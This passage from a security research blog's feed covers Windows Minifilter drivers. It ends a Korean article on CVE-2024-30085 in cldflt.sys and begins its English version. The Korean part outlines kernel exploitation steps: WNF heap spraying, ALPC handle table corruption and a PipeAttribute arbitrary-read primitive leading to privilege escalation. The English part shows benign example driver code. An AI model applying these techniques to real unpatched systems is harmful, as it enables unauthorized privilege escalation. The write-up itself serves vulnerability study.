&#xC0DD;&#xC18C;&#xD558;&#xC2E4; &#xAC81;&#xB2C8;&#xB2E4;. exploit&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574; &#xB450; sub system&#xC744; &#xC124;&#xBA85;&#xD574;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>ALPC (Asynchronous Local Procedure Call)</strong></p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image13.webp" alt></p><p>ALPC&#xB294; Windows &#xCEE4;&#xB110; &#xB0B4;&#xBD80;&#xC758; IPC &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC73C;&#xB85C;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xC11C;&#xBC84; &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD574; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC8FC;&#xACE0;&#xBC1B;&#xB294; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; ALPC&#xC758; HANDLE TABLE&#xC758; <code>_ALPC_HANDLE_ENTRY</code>&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xBA54;&#xC2DC;&#xC9C0; &#xBC84;&#xD37C; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;, &#xC774; TABLE&#xC758; &#xD06C;&#xAE30;&#xB294; &#xAC00;&#xBCC0;&#xC801;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Arbitrary &#xD06C;&#xAE30;&#xC758; &#xCEE4;&#xB110; &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;!</p><ul><li>ALPC &#xD3EC;&#xD2B8; &#xC0DD;&#xC131; &#xC2DC; <code>_ALPC_HANDLE_TABLE</code>&#xC774; <strong>paged pool</strong>&#xC5D0; 0x80 &#xD06C;&#xAE30;&#xB85C; &#xD560;&#xB2F9;&#xB428;</li><li><code>NtAlpcCreateResourceReserve</code> &#xD638;&#xCD9C; &#xC2DC;&#xB9C8;&#xB2E4; <code>_KALPC_RESERVE</code> &#xAC1D;&#xCCB4;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xACE0; &#xC774; &#xC8FC;&#xC18C;&#xAC00; HANDLE TABLE&#xC5D0; &#xCD94;&#xAC00;&#xB428;</li><li><p>&#xC774; &#xAD6C;&#xC870;&#xB97C; &#xBCC0;&#xC870;&#xD558;&#xBA74; &#xC784;&#xC758; &#xCEE4;&#xB110; &#xC8FC;&#xC18C; Read/Write primitive &#xAC00;&#xB2A5;</p><p>  &#x2192; PoC&#xC5D0;&#xC11C;&#xB294; fake <code>_KALPC_RESERVE</code>&#xB97C; &#xC8FC;&#xC785;&#xD574; arbitrary R/W &#xB2EC;&#xC131;</p></li><li><p>ALPC HANDLE&#xC740; User-Mode&#xC5D0;&#xC11C;&#xB3C4; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5; &#x2192; exploit&#xC5D0; &#xC6A9;&#xC774;&#xD574;&#xC9D0;</p></li></ul><blockquote><p><strong>WNF (Windows Notification Facility)</strong></p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image14.webp" alt></p><p>WNF&#xB294; Windows&#xC758; &#xC54C;&#xB9BC; &#xC2DC;&#xC2A4;&#xD15C;&#xC778;&#xB370;&#xC694;. WNF_NAME_INSTANCE &#xCEE4;&#xB110; &#xAC1D;&#xCCB4;&#xB294; &#xB0B4;&#xBD80;&#xC5D0; _WNF_STATE_DATA&#xB77C;&#xB294; &#xD544;&#xB4DC;&#xB97C; &#xAC00;&#xC9C0;&#xB294;&#xB370; &#xC774; &#xD06C;&#xAE30;&#xB294; &#xAC00;&#xBCC0;&#xC801;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; User-Mode&#xC5D0;&#xC11C; <code>NtCreateWnfStateName</code> + <code>NtUpdateWnfStateData</code>&#xB85C; &#xC9C1;&#xC811; &#xCEE4;&#xB110; &#xAC1D;&#xCCB4; &#xD06C;&#xAE30; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><code>_WNF_STATE_DATA</code>&#xB294; 0x1000 &#xD06C;&#xAE30;&#xB85C; &#xD560;&#xB2F9; &#xAC00;&#xB2A5; (0x10 header + 0xFF0 data)</li><li>heap spraying &#xC6A9;&#xB3C4;&#xB85C; WNF &#xAC1D;&#xCCB4;&#xB97C; &#xB2E4;&#xB7C9; &#xC0DD;&#xC131;&#xD574;, &#xBAA9;&#xD45C; &#xAD6C;&#xC870;&#xCCB4;(ALPC &#xAC1D;&#xCCB4;)&#xC640; &#xC778;&#xC811;&#xD558;&#xAC8C; &#xBC30;&#xCE58;</li><li>PoC&#xC5D0;&#xC11C;&#xB294; WNF&#xB97C; &#xC774;&#xC6A9;&#xD574; heap hole&#xC744; &#xB9CC;&#xB4E4;&#xACE0; ALPC &#xAC1D;&#xCCB4; &#xC778;&#xC811;&#xC5D0; &#xBC30;&#xCE58;&#xD558;&#xC5EC; ALPC HANDLE TABLE&#xC5D0; Overflow &#xC720;&#xB3C4;</li></ul><p>&#xD2B9;&#xD788; PoC&#xC5D0;&#xC11C;&#xB294; Pipe&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xC744; &#xB4F1;&#xB85D;&#xD574;&#xC57C; &#xD588;&#xB294;&#xB370;, &#xC800;&#xB294; &#xC774; &#xBD80;&#xBD84;&#xC774; &#xD765;&#xBBF8;&#xB85C;&#xC6E0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PipeAttribute</span> {</span>     LIST_ENTRY <span class="hljs-built_in">list</span>;     <span class="hljs-keyword">char</span> * AttributeName;     <span class="hljs-keyword">uint64_t</span> AttributeValueSize;     <span class="hljs-keyword">char</span> * AttributeValue;     <span class="hljs-keyword">char</span> data[<span class="hljs-number">0</span>];}</code></pre><p>Pipe&#xB294; &#xBCC0;&#xC870;&#xB41C; <code>PipeAttribute</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; Value &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB85C; &#xC138;&#xD305;&#xD574; &#xCEE4;&#xB110;&#xC774; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; &#xCC38;&#xC870;&#xD574; &#xC77D;&#xC740; &#xB370;&#xC774;&#xD130;&#xB97C; User-Mode &#xACF5;&#xAC04;&#xC5D0; &#xBC18;&#xD658;&#xD574;&#xC904; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294;&#xB370;&#xC694;. &#xC774;&#xB85C;&#xC368; ALPC&#xB85C; &#xD655;&#xBCF4;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xACFC; WNF Overflow &#xC870;&#xD569;&#xC744; &#xC774;&#xC6A9;&#xD574; Pipe&#xB97C; Arbitrary Read primitive&#xB85C; &#xC804;&#xD658;&#xD574; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xB97C; leak&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;!</p><h2 id="3-&#xB9C8;&#xBB34;&#xB9AC;"><a href="#3-&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="3. &#xB9C8;&#xBB34;&#xB9AC;"></a>3. &#xB9C8;&#xBB34;&#xB9AC;</h2><hr><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image15.gif" alt></p><p>&#xB9C8;&#xBB34;&#xB9AC;&#xB294; &#xC81C;&#xAC00; <code>cldflt.sys</code>&#xC758; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD2B9;&#xC131;, &#xADF8;&#xB9AC;&#xACE0; WNF + ALPC &#xAE30;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xAD6C;&#xD604;&#xD55C; LPE &#xACB0;&#xACFC;&#xB97C; &#xBCF4;&#xC5EC;&#xB4DC;&#xB9AC;&#xBA70; &#xB05D;&#xB0B4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. Minifilter&#xC744; &#xACF5;&#xBD80;&#xD558;&#xBA74;&#xC11C; &#xB290;&#xB080; &#xC810;&#xC740;.. &#xB3D9;&#xC791; &#xBC29;&#xC2DD;&#xC774;&#xB098; &#xD568;&#xC218;, &#xAC1C;&#xB150; &#xC790;&#xCCB4;&#xB294; &#xC870;&#xAE08; &#xC0DD;&#xC18C;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC;, &#xACB0;&#xAD6D;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xB294; &#xBC29;&#xC2DD;&#xC774;&#xB098; &#xB8E8;&#xD2B8; &#xCEE4;&#xC988; &#xC6D0;&#xB9AC;&#xB294; &#xBE44;&#xC2B7;&#xBE44;&#xC2B7;&#xD558;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4E4;&#xC5C8;&#xB124;&#xC694;&#x2026; &#xADF8;&#xB7EC;&#xB2C8; Minifilter &#xC9C4;&#xC785;&#xC5D0; &#xB108;&#xBB34; &#xAC81; &#xBA39;&#xC9C0; &#xC54A;&#xC73C;&#xC154;&#xB3C4; &#xB420; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!!</p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB3C4; &#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; &#xC544;&#xC9C1; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xC9C0; &#xC54A;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xB124;&#xC694;.. &#xB2E4;&#xC74C; &#xAE00;&#xB3C4; &#xB9CE;&#xC740; &#xAE30;&#xB300; &#xBD80;&#xD0C1;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><strong>Reference</strong></h1><hr><p><a href="https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/">https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/</a></p><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts">https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts</a></p><p><a href="https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/">https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/</a></p><p><a href="https://ssd-disclosure.com/ssd-advisory-cldflt-heap-based-overflow-pe/">https://ssd-disclosure.com/ssd-advisory-cldflt-heap-based-overflow-pe/</a></p><p><a href="https://reddogsecurity.substack.com/p/elevating-privileges-in-windows-insights?r=5awqb0&amp;utm_campaign=post&amp;utm_medium=web&amp;triedRedirect=true">https://reddogsecurity.substack.com/p/elevating-privileges-in-windows-insights?r=5awqb0&amp;utm_campaign=post&amp;utm_medium=web&amp;triedRedirect=true</a></p><p><a href="https://medium.com/@WaterBucket/understanding-mini-filter-drivers-for-windows-vulnerability-research-exploit-development-391153c945d6">https://medium.com/@WaterBucket/understanding-mini-filter-drivers-for-windows-vulnerability-research-exploit-development-391153c945d6</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/Minifilter/">Minifilter</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-30085/">CVE-2024-30085</category>
      
      <category domain="https://hackyboiz.github.io/tags/CldFlt/">CldFlt</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Walking Through Windows Minifilter Drivers (EN)</title>
      <link>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/en/</link>
      <guid>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/en/</guid>
      <pubDate>Fri, 15 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is banda. This is my first time greeting you with an article on Windows Minifilter Drivers. &amp;#x1F917;&lt;/p&gt;
&lt;p&gt;While studying W</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is banda. This is my first time greeting you with an article on Windows Minifilter Drivers. &#x1F917;</p><p>While studying Windows Kernel Drivers recently, I discovered that there are various types of drivers categorized by purpose, such as Bus Drivers, Filter Drivers, FSDs, and Minifilters. I became curious about the structural differences between Bus or Filter Drivers and traditional Function Drivers, as well as how vulnerabilities manifest in these different types.</p><p>Today, we will explore the structure and operation of Minifilter Drivers, examine their internal components, and analyze potential vulnerabilities.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image1.png" alt></p><h1 id="1-About-Minifilter-Drivers"><a href="#1-About-Minifilter-Drivers" class="headerlink" title="1. About Minifilter Drivers"></a>1. About Minifilter Drivers</h1><hr><p>A Minifilter driver is a specialized type of driver in Windows designed to monitor, intercept, and modify file system I/O requests such as file creation, opening, reading, writing, and deletion. It is commonly used for precise monitoring of file system activity.</p><p>If you think about it in terms of <strong>&#x201C;monitoring, blocking, or modifying file access&#x201D;</strong>, it starts to sound familiar, doesn&#x2019;t it? Indeed &#x2014; this functionality is well-suited for products like <strong>antivirus software, EDR solutions, and backup programs</strong>. In fact, I&#x2019;ve personally confirmed that many such products rely on Minifilter drivers.</p><p>A Minifilter driver can intercept or manipulate the following three types of requests:</p><ol><li>IRP (I/O Request Packet)</li><li>Fast I/O</li><li>File System Filter Callbacks</li></ol><h2 id="1-1-Filter-Manager-&#x2192;-Minifilter-Flow"><a href="#1-1-Filter-Manager-&#x2192;-Minifilter-Flow" class="headerlink" title="1.1 Filter Manager &#x2192; Minifilter Flow"></a>1.1 Filter Manager &#x2192; Minifilter Flow</h2><p>A Minifilter operates on top of the Windows Filter Manager (<code>fltmgr.sys</code>). The Filter Manager receives file I/O requests from the I/O Manager and forwards them to the registered Minifilter drivers in the order determined by their <strong>altitude</strong>. In other words, the altitude controls the order in which filters are loaded and invoked.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image2.gif" alt></p><p>Let&#x2019;s take a look at how file I/O requests are processed in Windows.</p><ol><li>An application issues an I/O operation by calling APIs such as <code>CreateFile</code>, <code>ReadFile</code>, or <code>WriteFile</code>.</li><li>The I/O Manager receives this request and forwards it to the Filter Manager (<code>fltmgr.sys</code>).</li><li>The Filter Manager checks the list of all registered Minifilter drivers and passes the request to each driver in the order of their altitude.</li><li>After the Minifilter completes its processing, the request is passed on to the file system filter driver.</li><li>Finally, the request is delivered to the disk driver (Storage Driver Stack), which accesses the physical disk or processes the data accordingly.</li></ol><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image3.png" alt></p><p>You can check the list of Minifilter drivers loaded on the system by running the <code>fltmc</code> command in the Command Prompt.</p><p>The higher the altitude value, the higher the priority, meaning the Minifilter can intercept or modify I/O requests earlier. However, the processing order differs depending on whether it is a pre-operation or post-operation callback.</p><ul><li><strong>Pre-operation</strong>: Called in <strong>descending altitude order</strong> (high &#x2192; low)</li><li><strong>Post-operation</strong>: Called in <strong>ascending altitude order</strong> (low &#x2192; high)</li></ul><p>Looking back at the overall flow&#x2026; a Minifilter driver does not directly handle IRPs in the traditional way.</p><p>Instead, the Filter Manager receives I/O requests on its behalf and passes them to the Minifilter through callback functions.</p><p>In other words, a Minifilter driver does <strong>not</strong> need to set up the <strong>DispatchRoutine</strong> that we commonly associate with traditional drivers!</p><h2 id="1-2-Minifilter-Callback-Routine"><a href="#1-2-Minifilter-Callback-Routine" class="headerlink" title="1.2 Minifilter Callback Routine"></a>1.2 Minifilter Callback Routine</h2><p>How can a Minifilter driver operate only on specific file operations?</p><p>This is possible thanks to a mechanism called <strong>callbacks</strong>.</p><p>As mentioned earlier, a Minifilter driver does <strong>not</strong> directly process IRPs through a <code>DispatchRoutine</code>.</p><p>Instead, it can &#x201C;hook&#x201D; I/O requests delivered via the Filter Manager.</p><p>By registering <strong>pre-operation (<code>PreOperation Callback</code>)</strong> and <strong>post-operation (<code>PostOperation Callback</code>)</strong> callbacks, a Minifilter can monitor or control I/O operations at the system level when they occur.</p><ul><li><strong>Pre-operation callback (<code>PFLT_PRE_OPERATION_CALLBACK</code>)</strong></li></ul><pre><code class="hljs c">PFLT_PRE_OPERATION_CALLBACK PfltPreOperationCallback;<span class="hljs-function">FLT_PREOP_CALLBACK_STATUS <span class="hljs-title">PfltPreOperationCallback</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, out] PFLT_CALLBACK_DATA Data,</span></span><span class="hljs-function"><span class="hljs-params">  [in]      PCFLT_RELATED_OBJECTS FltObjects,</span></span><span class="hljs-function"><span class="hljs-params">  [out]     PVOID *CompletionContext</span></span><span class="hljs-function"><span class="hljs-params">)</span></span><span class="hljs-function"></span>{...}</code></pre><p>Called before the I/O request is passed to the file system or lower drivers.</p><p>This is where the core logic of the Minifilter runs, with powerful capabilities such as returning</p><p><code>FLT_PREOP_COMPLETE</code>, <code>FLT_PREOP_SUCCESS_WITH_CALLBACK</code>, or <code>FLT_PREOP_SUCCESS_NO_CALLBACK</code>.</p><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_pre_operation_callback"><strong>PFLT_PRE_OPERATION_CALLBACK callback function (fltkernel.h)</strong></a></p><ul><li><strong>Post-operation callback (<code>PFLT_POST_OPERATION_CALLBACK</code>)</strong></li></ul><pre><code class="hljs c">PFLT_POST_OPERATION_CALLBACK PfltPostOperationCallback;<span class="hljs-function">FLT_POSTOP_CALLBACK_STATUS <span class="hljs-title">PfltPostOperationCallback</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, out]      PFLT_CALLBACK_DATA Data,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           PCFLT_RELATED_OBJECTS FltObjects,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] PVOID CompletionContext,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           FLT_POST_OPERATION_FLAGS Flags</span></span><span class="hljs-function"><span class="hljs-params">)</span></span><span class="hljs-function"></span>{...}</code></pre><p>Called on the way back after the I/O request has been fully processed by lower drivers and the file system.</p><p>It is typically used to verify the success of the operation, log results, or modify the outcome if needed.</p><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_post_operation_callback"><strong>PFLT_POST_OPERATION_CALLBACK callback function (fltkernel.h)</strong></a></p><p>In short, these callbacks are registered in the <code>FLT_OPERATION_REGISTRATION</code> structure, which specifies <strong>which pre-/post-operation callbacks are associated with which I/O operations (MajorFunctions)</strong>.</p><hr><h2 id="1-3-Communication-Between-Minifilter-and-User-Mode"><a href="#1-3-Communication-Between-Minifilter-and-User-Mode" class="headerlink" title="1.3 Communication Between Minifilter and User-Mode"></a>1.3 Communication Between Minifilter and User-Mode</h2><p>Communication between a Minifilter driver and a User-Mode application is handled via a <strong>filter communication port</strong>.</p><p>This port acts as a dedicated high-speed communication channel between the Minifilter and the application, allowing safe message exchange between Kernel-Mode drivers and User-Mode processes.</p><p>Let&#x2019;s look into the code and explore the APIs provided by Microsoft for this purpose.</p><h3 id="Driver-Code"><a href="#Driver-Code" class="headerlink" title="Driver Code"></a>Driver Code</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fltKernel.h&gt;</span></span>PFLT_FILTER gFilter = <span class="hljs-literal">NULL</span>;PFLT_PORT gServerPort = <span class="hljs-literal">NULL</span>, gClientPort = <span class="hljs-literal">NULL</span>;<span class="hljs-function">VOID <span class="hljs-title">OnDisconnect</span><span class="hljs-params">(PVOID Cookie)</span> </span>{    UNREFERENCED_PARAMETER(Cookie);    FltCloseClientPort(gFilter, &amp;gClientPort);    gClientPort = <span class="hljs-literal">NULL</span>;}<span class="hljs-function">NTSTATUS <span class="hljs-title">OnConnect</span><span class="hljs-params">(PFLT_PORT ClientPort, PVOID SrvCookie, PVOID Ctx, ULONG Size, PVOID* ConnCookie)</span> </span>{    UNREFERENCED_PARAMETER(SrvCookie);    UNREFERENCED_PARAMETER(Ctx);    UNREFERENCED_PARAMETER(Size);    UNREFERENCED_PARAMETER(ConnCookie);    gClientPort = ClientPort;    <span class="hljs-keyword">return</span> STATUS_SUCCESS;}<span class="hljs-function">FLT_PREOP_CALLBACK_STATUS <span class="hljs-title">PreCreate</span><span class="hljs-params">(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* Buff)</span> </span>{    UNREFERENCED_PARAMETER(FltObjects);    UNREFERENCED_PARAMETER(Buff);    PFLT_FILE_NAME_INFORMATION nameInfo;    <span class="hljs-keyword">if</span> (gClientPort &amp;&amp; NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &amp;nameInfo))) {        FltSendMessage(gFilter, &amp;gClientPort, nameInfo-&gt;Name.Buffer, nameInfo-&gt;Name.Length, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);        FltReleaseFileNameInformation(nameInfo);    }    <span class="hljs-keyword">return</span> FLT_PREOP_SUCCESS_NO_CALLBACK;}<span class="hljs-function">NTSTATUS <span class="hljs-title">Unload</span><span class="hljs-params">(FLT_FILTER_UNLOAD_FLAGS Flags)</span> </span>{    UNREFERENCED_PARAMETER(Flags);    FltCloseCommunicationPort(gServerPort);    FltUnregisterFilter(gFilter);    <span class="hljs-keyword">return</span> STATUS_SUCCESS;}<span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span> </span>{    UNREFERENCED_PARAMETER(RegistryPath);    NTSTATUS status;    <span class="hljs-keyword">const</span> FLT_OPERATION_REGISTRATION Cbs[] = { { IRP_MJ_CREATE, <span class="hljs-number">0</span>, PreCreate, <span class="hljs-literal">NULL</span> }, { IRP_MJ_OPERATION_END } };    <span class="hljs-keyword">const</span> FLT_REGISTRATION Reg = { <span class="hljs-keyword">sizeof</span>(FLT_REGISTRATION), FLT_REGISTRATION_VERSION, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, Cbs, Unload };    status = FltRegisterFilter(DriverObject, &amp;Reg, &amp;gFilter);    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) <span class="hljs-keyword">return</span> status;    UNICODE_STRING portName = RTL_CONSTANT_STRING(<span class="hljs-string">L&quot;\\FileActivityMonitorPort&quot;</span>);    OBJECT_ATTRIBUTES oa = { <span class="hljs-keyword">sizeof</span>(oa), <span class="hljs-literal">NULL</span>, &amp;portName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, <span class="hljs-literal">NULL</span> };    status = FltCreateCommunicationPort(gFilter, &amp;gServerPort, &amp;oa, <span class="hljs-literal">NULL</span>, OnConnect, OnDisconnect, <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {        FltUnregisterFilter(gFilter);        <span class="hljs-keyword">return</span> status;    }    <span class="hljs-keyword">return</span> FltStartFiltering(gFilter);}</code></pre><p>Focusing on the representative driver code APIs <code>FltCreateCommunicationPort()</code>, <code>FltSendMessage()</code>, and <code>FltCloseCommunicationPort()</code>, I have implemented an example Minifilter driver code.</p><p>Let&#x2019;s walk through the flow together:</p><ol><li><p>The driver registers itself using <code>FltRegisterFilter()</code>.</p><p> At this stage, it specifies a <strong>PreCreateCallback</strong> function to monitor file creation and open (<code>IRP_MJ_CREATE</code>) requests, and starts I/O monitoring with <code>FltStartFiltering()</code>.</p></li><li><p>Using the <code>FltCreateCommunicationPort()</code> function, the driver can create a communication port.</p><p> In the code above, it creates the port <code>\\FileActivityMonitorPort</code>, which allows a User-Mode application to connect and receive notifications.</p></li><li><p>When a file create/open event occurs, <strong>PreCreateCallback</strong> is invoked, and the function collects information about which process accessed which file.</p></li><li>The driver then uses <code>FltSendMessage()</code> to immediately send the real-time file access information collected in <strong>PreCreateCallback</strong> to the connected User-Mode application.</li><li>Finally, in the <strong>FilterUnload</strong> routine, when the driver is unloaded, it closes the communication port with <code>FltCloseCommunicationPort()</code> and unregisters the filter.</li></ol><h3 id="User-Mode-Application-Code"><a href="#User-Mode-Application-Code" class="headerlink" title="User-Mode Application Code"></a>User-Mode Application Code</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fltuser.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;fltlib.lib&quot;</span>)</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    HANDLE port;    HRESULT hr;        BYTE buffer[<span class="hljs-keyword">sizeof</span>(FILTER_MESSAGE_HEADER) + <span class="hljs-number">1024</span>];    PFILTER_MESSAGE_HEADER header = (PFILTER_MESSAGE_HEADER)buffer;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connecting to driver...\n&quot;</span>);    hr = FilterConnectCommunicationPort(<span class="hljs-string">L&quot;\\FileActivityMonitorPort&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, &amp;port);    <span class="hljs-keyword">if</span> (IS_ERROR(hr)) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection failed. Error 0x%X\n&quot;</span>, hr);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connected. Waiting for file events...\n&quot;</span>);    <span class="hljs-keyword">while</span> (TRUE) {        hr = FilterGetMessage(port, header, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-literal">NULL</span>);                <span class="hljs-keyword">if</span> (SUCCEEDED(hr)) {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;File Accessed: %S\n&quot;</span>, (PWSTR)header-&gt;MessageBody);        } <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection lost. Error 0x%X\n&quot;</span>, hr);            <span class="hljs-keyword">break</span>;        }    }    CloseHandle(port);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>Let&#x2019;s now look at the communication flow from the User-Mode application side.</p><p>Representative APIs include <code>FilterConnectCommunicationPort()</code> and <code>FilterSendMessage()</code>.</p><ol><li>First, the application uses <code>FilterConnectCommunicationPort()</code> to connect to the Minifilter driver&#x2019;s communication port in the kernel, <code>\\FileActivityMonitorPort</code>, and obtains a HANDLE for communication.</li><li><p>It then calls <code>FilterGetMessage()</code> to directly receive the file path string from the driver.</p><p> If the message is received successfully, the application outputs the file path to the screen.</p></li></ol><h1 id="2-CVE-2024-30085-1-Day-Analysis"><a href="#2-CVE-2024-30085-1-Day-Analysis" class="headerlink" title="2. [CVE-2024-30085] 1-Day Analysis"></a>2. [CVE-2024-30085] 1-Day Analysis</h1><hr><p>This is a Windows Minifilter Driver vulnerability that was also introduced in &#x201C;1day1line&#x201D; (<a href="https://hackyboiz.github.io/2025/01/11/OUYA77/2025-01-11/">reference</a>).</p><p>Let&#x2019;s try to reproduce CVE-2024-30085 and, in the process, learn more about Minifilter drivers.</p><blockquote><p>&#x1FA9F; Environment: Windows 11 22H2/23H2 10.0.2261.3672</p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image4.png" alt></p><p>The Windows Cloud Files Mini Filter driver is responsible for the Windows cloud sync feature.</p><p>For example, I&#x2019;ve taken a screenshot of one of my folders.</p><p>To understand this Minifilter driver vulnerability, we first need some background knowledge about Stub Files and Reparse Points.</p><h3 id="What-is-a-Stub-File"><a href="#What-is-a-Stub-File" class="headerlink" title="What is a Stub File?"></a>What is a Stub File?</h3><p>A stub file refers to a file that exists only as a placeholder locally, without containing any actual data.</p><p>As shown in the image above, the &#x201C;Pictures&#x201D; folder has a blue cloud icon in its status &#x2014; this indicates that the file is in a stub state.</p><p>On NTFS, its size, name, and icon are displayed, but its actual contents are not stored locally.</p><h3 